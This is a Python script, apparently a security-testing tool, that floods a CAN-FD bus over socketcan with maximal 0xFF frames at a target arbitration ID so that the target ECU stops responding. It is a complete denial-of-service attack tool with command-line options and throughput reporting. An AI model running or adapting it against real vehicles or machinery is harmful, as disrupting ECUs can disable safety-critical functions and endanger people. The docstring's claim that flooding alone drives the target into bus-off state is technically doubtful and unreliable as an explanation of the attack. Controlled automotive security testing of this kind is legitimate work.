#!/usr/bin/env python3
"""
bus_off_attack.py

Purpose:
Test if a CAN node goes into bus-off state when flooded with frames.

How it works:
Sends lots of CAN frames really fast to a target ID. If the target
gets too many errors, it should go into bus-off state and stop responding.
"""

import sys
import time
import signal
import can

DEFAULT_CHANNEL = "can0"
DEFAULT_TARGET_ID = 0x123  # Example target ID


def parse_int(x):
    """Convert hex or decimal string to int"""
    x = x.strip().lower()
    return int(x, 16) if x.startswith("0x") else int(x)


def main():
    channel = DEFAULT_CHANNEL
    target_id = DEFAULT_TARGET_ID
    duration = 10
    
    # Parse command line arguments
    if len(sys.argv) > 1:
        i = 1
        while i < len(sys.argv):
            arg = sys.argv[i]
            if arg == "--channel" and i + 1 < len(sys.argv):
                channel = sys.argv[i + 1]
                i += 2
            elif arg == "--target" and i + 1 < len(sys.argv):
                target_id = parse_int(sys.argv[i + 1])
                i += 2
            elif arg == "--duration" and i + 1 < len(sys.argv):
                duration = int(sys.argv[i + 1])
                i += 2
            elif arg == "--help" or arg == "-h":
                print("Usage: python3 bus_off_attack.py [options]")
                print("\nOptions:")
                print("  --channel <name>    CAN interface (default: can0)")
                print("  --target <id>       Target CAN ID in hex (default: 0x123)")
                print("  --duration <sec>    Attack duration in seconds (default: 10)")
                print("  -h, --help          Show this help")
                return
            else:
                i += 1
    
    print("=" * 60)
    print("CAN Bus-Off Attack Test")
    print("=" * 60)
    print(f"Channel: {channel}")
    print(f"Target ID: 0x{target_id:08X}")
    print(f"Duration: {duration} seconds")
    print("=" * 60)
    print("\nSending frames as fast as possible...")
    print("Press Ctrl+C to stop\n")
    
    try:
        bus = can.Bus(
            channel=channel,
            interface="socketcan",
            fd=True,
            bitrate=500000,
            data_bitrate=2000000,
            receive_own_messages=False
        )
    except Exception as e:
        print(f"[!] Failed to connect: {e}")
        print(f"    Make sure {channel} is configured:")
        print(f"    sudo ip link set {channel} up type can bitrate 500000 dbitrate 2000000 fd on")
        return
    
    count = 0
    start_time = time.time()
    running = True
    
    def signal_handler(sig, frame):
        nonlocal running
        running = False
        print("\n[!] Stopping...")
    
    signal.signal(signal.SIGINT, signal_handler)
    
    # Send frames with max data (64 bytes for CAN-FD)
    payload = bytes([0xFF] * 64)
    
    try:
        with bus:
            while running and (time.time() - start_time) < duration:
                msg = can.Message(
                    arbitration_id=target_id,
                    data=payload,
                    is_extended_id=True,
                    is_fd=True,
                    bitrate_switch=True
                )
                
                try:
                    bus.send(msg, timeout=0.001)
                    count += 1
                    
                    # Print stats every 10000 frames
                    if count % 10000 == 0:
                        elapsed = time.time() - start_time
                        rate = count / elapsed if elapsed > 0 else 0
                        print(f"Sent {count} frames ({rate:.0f} frames/sec)")
                except:
                    pass  # Bus might be full, keep trying
    
    except KeyboardInterrupt:
        pass
    finally:
        try:
            bus.shutdown()
        except:
            pass
    
    elapsed = time.time() - start_time
    rate = count / elapsed if elapsed > 0 else 0
    
    print("\n" + "=" * 60)
    print(f"Total frames sent: {count}")
    print(f"Duration: {elapsed:.2f} seconds")
    print(f"Average rate: {rate:.0f} frames/second")
    print("=" * 60)
    print("\nNote: Check if target ECU stopped responding (bus-off state)")


if __name__ == "__main__":
    main()
